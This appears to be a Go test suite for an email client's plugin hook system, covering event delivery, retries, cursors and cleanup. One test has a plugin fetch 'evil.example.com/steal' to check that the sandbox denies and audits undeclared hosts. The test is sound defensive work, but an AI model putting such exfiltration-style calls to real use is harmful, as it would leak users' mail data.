package core

import (
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"sync"
	"testing"
	"time"

	"github.com/godwit-email/godwit/core/plugins"
	"github.com/godwit-email/godwit/core/store"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// recorder logs every message.received delivery to ctx.storage "log".
const recorder = `export default function (ctx: any) {
  ctx.on("message.received", async (m: any, info: any) => {
    const log = JSON.parse((await ctx.storage.get("log")) ?? "[]")
    log.push({ ...m, key: info.idempotencyKey })
    await ctx.storage.set("log", JSON.stringify(log))
  })
}`

type delivery struct {
	ID        int64  `json:"id"`
	AccountID int64  `json:"accountId"`
	Subject   string `json:"subject"`
	From      string `json:"from"`
	Date      string `json:"date"`
	Deleted   bool   `json:"deleted"`
	Key       string `json:"key"`
}

func hookLog(t *testing.T, s *Service, name string) []delivery {
	t.Helper()
	rows, err := s.db.Query(bg, "SELECT value FROM plugin_kv WHERE plugin = ? AND key = 'log'", name)
	require.NoError(t, err)
	var out []delivery
	if len(rows.Values) > 0 {
		require.NoError(t, json.Unmarshal([]byte(store.Str(rows.Values[0][0])), &out))
	}
	return out
}

func waitLog(t *testing.T, s *Service, name string, n int) []delivery {
	t.Helper()
	require.Eventually(t, func() bool { return len(hookLog(t, s, name)) >= n }, 10*time.Second, 10*time.Millisecond)
	return hookLog(t, s, name)
}

func cursor(t *testing.T, s *Service, name string) int64 {
	t.Helper()
	rows, err := s.db.Query(bg, "SELECT seq FROM plugin_cursors WHERE plugin = ?", name)
	require.NoError(t, err)
	require.Len(t, rows.Values, 1)
	return store.Int(rows.Values[0][0])
}

func (e *syncEnv) newMail(t *testing.T, id, subject string) {
	t.Helper()
	e.put(t, "INBOX", eml(id, "Bob <bob@example.com>", "alice@example.com", subject, "Tue, 06 Oct 2026 08:30:00 +0000", "hello"))
}

const hookPerms = `{"mail":["read"]}`

// setPluginHook installs f as pluginHook for the test.
func setPluginHook(t *testing.T, f func(stage, name string) error) {
	t.Helper()
	pluginHook = f
	t.Cleanup(func() { pluginHook = nil })
}

// newSyncedEnv has synced INBOX once with one message in it: last_uid > 0,
// so what arrives next is new mail.
func newSyncedEnv(t *testing.T) *syncEnv {
	t.Helper()
	e := newSyncEnv(t)
	e.newMail(t, "old@x", "before")
	e.sync(t)
	return e
}

func TestHookReceivesNewMail(t *testing.T) {
	e := newSyncedEnv(t)
	startTestPlugin(t, e.s, "rec", hookPerms, recorder)
	e.newMail(t, "new@x", "fresh news")
	e.sync(t)

	got := waitLog(t, e.s, "rec", 1)
	seq := store.Int(e.rows(t, "SELECT seq FROM events_log")[0][0])
	assert.Equal(t, []delivery{{ID: e.idOf(t, "new@x"), AccountID: e.acc.ID, Subject: "fresh news", From: "Bob <bob@example.com>",
		Date: "2026-10-06T08:30:00Z", Key: fmt.Sprintf("rec:%d", seq)}}, got)
	require.Eventually(t, func() bool { return cursor(t, e.s, "rec") == seq }, 5*time.Second, 10*time.Millisecond)
	assert.Equal(t, [][]any{{"message.received", e.acc.ID, e.idOf(t, "new@x"), "fresh news", "Bob <bob@example.com>", int64(1791275400)}},
		e.rows(t, "SELECT type, account_id, message_id, subject, from_addr, msg_date FROM events_log"))
}

func TestInitialSyncNoHooks(t *testing.T) {
	e := newSyncEnv(t)
	for i := range 50 {
		e.newMail(t, fmt.Sprintf("m%d@x", i), "s")
	}
	e.sync(t)
	assert.Equal(t, 50, e.count(t, "SELECT count(*) FROM messages"))
	assert.Zero(t, e.count(t, "SELECT count(*) FROM events_log"), "a first sync is not new mail")
	e.newMail(t, "late@x", "s")
	e.sync(t)
	assert.Equal(t, [][]any{{e.idOf(t, "late@x")}}, e.rows(t, "SELECT message_id FROM events_log"))
}

func TestUIDValidityReimportNoHooks(t *testing.T) {
	e := newSyncEnv(t)
	e.put(t, "Archive", eml("a1@x", "bob@example.com", "alice@example.com", "s", day, "b"))
	e.sync(t)
	require.NoError(t, e.im.User.Delete("Archive"))
	require.NoError(t, e.im.User.Create("Archive", nil))
	e.put(t, "Archive", eml("a1@x", "bob@example.com", "alice@example.com", "s", day, "b"))
	e.put(t, "Archive", eml("a2@x", "bob@example.com", "alice@example.com", "s", day, "b"))
	e.sync(t)
	assert.Equal(t, 2, e.count(t, "SELECT count(*) FROM messages WHERE message_id IN ('a1@x', 'a2@x')"))
	assert.Zero(t, e.count(t, "SELECT count(*) FROM events_log"), "a rebuild reimport is not new mail")
	e.put(t, "Archive", eml("a3@x", "bob@example.com", "alice@example.com", "s", day, "b"))
	e.sync(t)
	assert.Equal(t, [][]any{{e.idOf(t, "a3@x")}}, e.rows(t, "SELECT message_id FROM events_log"))
}

func TestBackfillNoHooks(t *testing.T) {
	e := newSyncEnv(t)
	_, err := e.s.db.Execute(bg, "UPDATE accounts SET sync_limit = 2 WHERE id = ?", e.acc.ID)
	require.NoError(t, err)
	for i := range 5 {
		e.newMail(t, fmt.Sprintf("m%d@x", i), "s")
	}
	e.sync(t)
	_, err = e.s.db.Execute(bg, "UPDATE accounts SET sync_limit = 10 WHERE id = ?", e.acc.ID)
	require.NoError(t, err)
	e.sync(t)
	assert.Equal(t, 5, e.count(t, "SELECT count(*) FROM messages"))
	assert.Zero(t, e.count(t, "SELECT count(*) FROM events_log"), "a backfill is not new mail")
	e.newMail(t, "late@x", "s")
	e.sync(t)
	assert.Equal(t, [][]any{{e.idOf(t, "late@x")}}, e.rows(t, "SELECT message_id FROM events_log"))
}

// A crash after the handler ran and before the cursor moved delivers the
// event again, with the same key; there is no limit on how often.
func TestHookAtLeastOnceAcrossRestarts(t *testing.T) {
	e := newSyncedEnv(t)
	var mu sync.Mutex
	crashes := 0
	crashed := make(chan struct{}, 2)
	setPluginHook(t, func(stage, name string) error {
		mu.Lock()
		defer mu.Unlock()
		if stage == "hook.advance" && crashes < 2 {
			crashes++
			crashed <- struct{}{}
			return errors.New("crash")
		}
		return nil
	})
	startTestPlugin(t, e.s, "rec", hookPerms, recorder)
	e.newMail(t, "new@x", "again")
	e.sync(t)
	for n := 1; n <= 2; n++ {
		waitLog(t, e.s, "rec", n)
		// The log write is visible before the crash; closing earlier would
		// cancel the delivery instead and leave the crash to a later instance.
		select {
		case <-crashed:
		case <-time.After(10 * time.Second):
			t.Fatalf("delivery %d never reached the cursor move", n)
		}
		require.NoError(t, e.s.Close())
		s, err := New(bg, Options{DataDir: e.dir, ImageClient: loopbackImageClient()})
		require.NoError(t, err)
		t.Cleanup(func() { s.Close() })
		e.s = s
	}
	got := waitLog(t, e.s, "rec", 3)
	seq := store.Int(e.rows(t, "SELECT seq FROM events_log")[0][0])
	require.Eventually(t, func() bool { return cursor(t, e.s, "rec") == seq }, 5*time.Second, 10*time.Millisecond)
	require.Len(t, got, 3)
	for _, d := range got {
		assert.Equal(t, fmt.Sprintf("rec:%d", seq), d.Key)
		assert.Equal(t, "again", d.Subject)
	}
}

func TestHookDeletedMessage(t *testing.T) {
	e := newSyncedEnv(t)
	startTestPlugin(t, e.s, "rec", hookPerms, recorder)
	require.NoError(t, e.s.SetPluginEnabled(bg, "rec", false))
	e.newMail(t, "gone@x", "short-lived")
	e.sync(t)
	id := e.idOf(t, "gone@x")
	_, err := e.s.db.Execute(bg, "DELETE FROM messages WHERE id = ?", id)
	require.NoError(t, err)
	require.NoError(t, e.s.SetPluginEnabled(bg, "rec", true))

	got := waitLog(t, e.s, "rec", 1)
	seq := store.Int(e.rows(t, "SELECT seq FROM events_log")[0][0])
	assert.Equal(t, []delivery{{ID: id, AccountID: e.acc.ID, Subject: "short-lived", From: "Bob <bob@example.com>",
		Date: "2026-10-06T08:30:00Z", Deleted: true, Key: fmt.Sprintf("rec:%d", seq)}}, got)
	require.Eventually(t, func() bool { return cursor(t, e.s, "rec") == seq }, 5*time.Second, 10*time.Millisecond)
}

// fakeClock fires backoff waits at once and records them; hookPoll timers
// are held until tick.
type fakeClock struct {
	mu     sync.Mutex
	delays []time.Duration
	held   []func()
}

func (c *fakeClock) AfterFunc(d time.Duration, f func()) func() bool {
	c.mu.Lock()
	defer c.mu.Unlock()
	if d == hookPoll {
		c.held = append(c.held, f)
	} else {
		c.delays = append(c.delays, d)
		go f()
	}
	return func() bool { return false }
}

// tick fires every held poll timer.
func (c *fakeClock) tick() {
	c.mu.Lock()
	held := c.held
	c.held = nil
	c.mu.Unlock()
	for _, f := range held {
		f()
	}
}

func (c *fakeClock) got() []time.Duration {
	c.mu.Lock()
	defer c.mu.Unlock()
	return append([]time.Duration(nil), c.delays...)
}

// useFakeClock makes Services created from now on in the test use a fakeClock.
func useFakeClock(t *testing.T) *fakeClock {
	c := &fakeClock{}
	testHookClock = c
	t.Cleanup(func() { testHookClock = nil })
	return c
}

func TestHookBackoffAndDisable(t *testing.T) {
	clock := useFakeClock(t)
	e := newSyncedEnv(t)
	startTestPlugin(t, e.s, "flaky", hookPerms, `export default function (ctx: any) {
  ctx.on("message.received", async (m: any, info: any) => {
    if (!(await ctx.storage.get("ok"))) throw new Error("not yet")
    await ctx.storage.set("log", JSON.stringify([{ ...m, key: info.idempotencyKey }]))
  })
}`)
	start := cursor(t, e.s, "flaky")
	e.newMail(t, "n@x", "retry me")
	e.sync(t)

	require.Eventually(t, func() bool {
		return store.Str(e.rows(t, "SELECT disabled_reason FROM plugins WHERE name = 'flaky'")[0][0]) == disabledFailures
	}, 10*time.Second, 10*time.Millisecond)
	_, running := e.s.RunningPluginForTest("flaky")
	assert.False(t, running)
	assert.Equal(t, []time.Duration{2 * time.Second, 4 * time.Second}, clock.got()[:2])
	assert.Equal(t, start, cursor(t, e.s, "flaky"), "the cursor stays on the failed event")
	assert.Equal(t, 5*time.Minute, hookBackoff(20))

	_, err := e.s.db.Execute(bg, "INSERT INTO plugin_kv(plugin, key, value) VALUES ('flaky', 'ok', '1')")
	require.NoError(t, err)
	require.NoError(t, e.s.SetPluginEnabled(bg, "flaky", true))
	got := waitLog(t, e.s, "flaky", 1)
	assert.Equal(t, "retry me", got[0].Subject)
}

func TestHookResumeAfterReenable(t *testing.T) {
	e := newSyncedEnv(t)
	startTestPlugin(t, e.s, "rec", hookPerms, recorder)
	e.newMail(t, "one@x", "one")
	e.sync(t)
	waitLog(t, e.s, "rec", 1)
	// the log is written before the handler returns: disabling before the cursor moves redelivers "one"
	seq := store.Int(e.rows(t, "SELECT seq FROM events_log")[0][0])
	require.Eventually(t, func() bool { return cursor(t, e.s, "rec") == seq }, 5*time.Second, 10*time.Millisecond)
	require.NoError(t, e.s.SetPluginEnabled(bg, "rec", false))
	e.newMail(t, "two@x", "two")
	e.sync(t)
	time.Sleep(100 * time.Millisecond)
	assert.Len(t, hookLog(t, e.s, "rec"), 1, "nothing is delivered while disabled")
	require.NoError(t, e.s.SetPluginEnabled(bg, "rec", true))
	waitLog(t, e.s, "rec", 2)
	time.Sleep(100 * time.Millisecond) // no redelivery of "one"
	got := hookLog(t, e.s, "rec")
	require.Len(t, got, 2)
	assert.Equal(t, []string{"one", "two"}, []string{got[0].Subject, got[1].Subject})
}

// Cleanup running alongside delivery never removes an event a cursor still
// needs; once delivered, old events go.
func TestHookCleanupRace(t *testing.T) {
	s := newMailContextService(t)
	startTestPlugin(t, s, "rec", hookPerms, recorder)
	old := time.Now().Add(-8 * 24 * time.Hour).Unix()
	const n = 60
	for i := range n {
		_, err := s.db.Execute(bg, `INSERT INTO events_log(type, account_id, message_id, subject, from_addr, msg_date, created_at)
			VALUES ('message.received', 1, ?, ?, 'x', 0, ?)`, 1000+i, fmt.Sprint(i), old)
		require.NoError(t, err)
	}
	stop := make(chan struct{})
	done := make(chan struct{})
	go func() {
		defer close(done)
		for {
			select {
			case <-stop:
				return
			default:
				assert.NoError(t, s.cleanEvents(bg))
			}
		}
	}()
	s.notifyHooks()
	got := waitLog(t, s, "rec", n)
	close(stop)
	<-done
	require.Len(t, got, n)
	for i, d := range got {
		assert.Equal(t, fmt.Sprint(i), d.Subject)
	}
	require.Eventually(t, func() bool {
		rows, err := s.db.Query(bg, "SELECT max(seq) FROM events_log")
		require.NoError(t, err)
		return cursor(t, s, "rec") == store.Int(rows.Values[0][0])
	}, 5*time.Second, 10*time.Millisecond)
	require.NoError(t, s.cleanEvents(bg))
	rows, err := s.db.Query(bg, "SELECT count(*) FROM events_log")
	require.NoError(t, err)
	assert.Equal(t, int64(1), store.Int(rows.Values[0][0]), "only the cursor's own event is kept")
}

func TestCloseStopsDispatchers(t *testing.T) {
	s := newMailContextService(t)
	var mu sync.Mutex
	stopped := 0
	setPluginHook(t, func(stage, name string) error {
		if stage == "hook.stopped" {
			mu.Lock()
			stopped++
			mu.Unlock()
		}
		return nil
	})
	startTestPlugin(t, s, "stuck", hookPerms, `export default function (ctx: any) {
  ctx.on("message.received", async () => { await ctx.storage.set("entered", "1"); await new Promise(() => {}) })
}`)
	_, err := s.db.Execute(bg, `INSERT INTO events_log(type, account_id, message_id, created_at) VALUES ('message.received', 1, 1, unixepoch())`)
	require.NoError(t, err)
	s.notifyHooks()
	require.Eventually(t, func() bool {
		rows, err := s.db.Query(bg, "SELECT count(*) FROM plugin_kv WHERE key = 'entered'")
		require.NoError(t, err)
		return store.Int(rows.Values[0][0]) == 1
	}, 5*time.Second, 10*time.Millisecond)
	within(t, 5*time.Second, "Close", func() { require.NoError(t, s.Close()) })
	mu.Lock()
	defer mu.Unlock()
	assert.Equal(t, 1, stopped, "the dispatcher ended before Close returned")
}

// A hook may fetch from its declared, granted hosts with no approval; any
// other host is denied, and both are audited under the delivery's key.
func TestHookFetchDeclaredHost(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, "pong") }))
	t.Cleanup(srv.Close)
	_, port, _ := net.SplitHostPort(srv.Listener.Addr().String())
	api, evil := "api.example.com:"+port, "evil.example.com:"+port
	s := newMailContextService(t)
	s.pluginNet = plugins.NetOptions{Resolver: mapDNS{"api.example.com": "127.0.0.1", "evil.example.com": "127.0.0.1"},
		AllowHTTP: true, AllowLoopback: true}
	startTestPlugin(t, s, "net", `{"mail":["read"],"net":["`+api+`"]}`, `export default function (ctx: any) {
  ctx.on("message.received", async () => {
    const ok = await (await ctx.net.fetch("http://`+api+`/ping")).text()
    let denied = ""
    try { await ctx.net.fetch("http://`+evil+`/steal") } catch (e: any) { denied = String(e.message) }
    await ctx.storage.set("log", JSON.stringify([{ subject: ok + "|" + denied }]))
  })
}`)
	_, err := s.db.Execute(bg, `INSERT INTO events_log(type, account_id, message_id, created_at) VALUES ('message.received', 1, 1, unixepoch())`)
	require.NoError(t, err)
	seq := store.Int(must(s.db.Query(bg, "SELECT max(seq) FROM events_log")).Values[0][0])
	s.notifyHooks()

	got := waitLog(t, s, "net", 1)
	assert.Contains(t, got[0].Subject, "pong|")
	assert.Contains(t, got[0].Subject, "permission denied: net:"+evil)
	rows, err := s.db.Query(bg, "SELECT call_id, destination, decision, COALESCE(reason, '') FROM audit_log WHERE tool = 'plugin:net:net.fetch' ORDER BY id")
	require.NoError(t, err)
	key := fmt.Sprintf("net:%d", seq)
	assert.Equal(t, [][]any{{key, api, "allow", ""}, {key, evil, "deny", "host_not_allowed"}}, rows.Values)
	rows, err = s.db.Query(bg, "SELECT count(*) FROM approvals")
	require.NoError(t, err)
	assert.Zero(t, store.Int(rows.Values[0][0]), "no approval asked")
}

// A folder that was empty at its first sync has new mail from then on.
func TestHookEmptyFolderFirstArrival(t *testing.T) {
	e := newSyncEnv(t)
	e.sync(t)
	e.newMail(t, "first@x", "first ever")
	e.sync(t)
	assert.Equal(t, [][]any{{e.idOf(t, "first@x")}}, e.rows(t, "SELECT message_id FROM events_log"))
}

// The dedicated wake-up keeps a signal sent while the dispatcher is busy,
// and the periodic re-query finds an event no one signalled.
func TestHookWakeAndPoll(t *testing.T) {
	clock := useFakeClock(t)
	s := newMailContextService(t)
	release := make(chan struct{})
	var once sync.Once
	setPluginHook(t, func(stage, name string) error {
		if stage == "hook.advance" {
			once.Do(func() { <-release }) // busy on the first event
		}
		return nil
	})
	startTestPlugin(t, s, "rec", hookPerms, recorder)
	add := func(subject string) {
		_, err := s.db.Execute(bg, `INSERT INTO events_log(type, account_id, message_id, subject, created_at)
			VALUES ('message.received', 1, 1, ?, unixepoch())`, subject)
		require.NoError(t, err)
	}
	add("one")
	s.notifyHooks()
	waitLog(t, s, "rec", 1) // delivered; now blocked before its cursor moves
	add("two")
	s.notifyHooks() // while busy
	close(release)
	assert.Equal(t, "two", waitLog(t, s, "rec", 2)[1].Subject, "the wake-up sent while busy is kept")

	add("three") // no signal at all
	time.Sleep(100 * time.Millisecond)
	assert.Len(t, hookLog(t, s, "rec"), 2, "nothing woke the dispatcher yet")
	clock.tick()
	assert.Equal(t, "three", waitLog(t, s, "rec", 3)[2].Subject, "the periodic re-query finds it")
}

// Cleanup runs on the timer even with no hook plugin (no cursors).
func TestHookCleanupTimer(t *testing.T) {
	clock := useFakeClock(t)
	s := newMailContextService(t)
	old := time.Now().Add(-8 * 24 * time.Hour).Unix()
	for _, at := range []int64{old, time.Now().Unix()} {
		_, err := s.db.Execute(bg, `INSERT INTO events_log(type, account_id, message_id, created_at) VALUES ('message.received', 1, 1, ?)`, at)
		require.NoError(t, err)
	}
	count := func() int64 {
		rows, err := s.db.Query(bg, "SELECT count(*) FROM events_log")
		require.NoError(t, err)
		return store.Int(rows.Values[0][0])
	}
	require.Equal(t, int64(2), count())
	require.Eventually(t, func() bool { clock.tick(); return count() == 1 }, 5*time.Second, 10*time.Millisecond)
}
